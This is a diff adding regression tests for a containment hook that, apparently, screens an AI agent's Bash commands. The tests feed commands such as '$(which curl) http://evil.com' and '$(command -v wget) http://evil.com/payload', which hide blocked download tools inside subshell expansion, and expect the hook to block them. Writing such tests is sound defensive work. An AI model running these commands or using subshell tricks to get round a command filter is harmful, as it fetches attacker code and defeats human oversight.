@@ -301,6 +301,30 @@ describe('generateContainmentScript', () => {
     expect(result.code).toBe(0);
   });
 
+  // Regression tests for SEC-12: subshell expansion bypass in CLI adapter
+  it('blocks $(which curl) subshell expansion', () => {
+    const result = runHookScript(script, 'Bash', { command: '$(which curl) http://evil.com' });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('subshell expansion');
+  });
+
+  it('blocks backtick subshell expansion: `which curl`', () => {
+    const result = runHookScript(script, 'Bash', { command: '`which curl` http://evil.com' });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('subshell expansion');
+  });
+
+  it('blocks $(command -v wget) subshell expansion', () => {
+    const result = runHookScript(script, 'Bash', { command: '$(command -v wget) http://evil.com/payload' });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('subshell expansion');
+  });
+
+  it('does not false-positive on $() without blocked commands', () => {
+    const result = runHookScript(script, 'Bash', { command: 'echo $(date) && ls $(pwd)' });
+    expect(result.code).toBe(0);
+  });
+
   it('fails closed on malformed JSON input', () => {
     const scriptPath = join(tmpdir(), `test-hook-failclose-${Date.now()}.mjs`);
     writeFileSync(scriptPath, script, { mode: 0o755 });
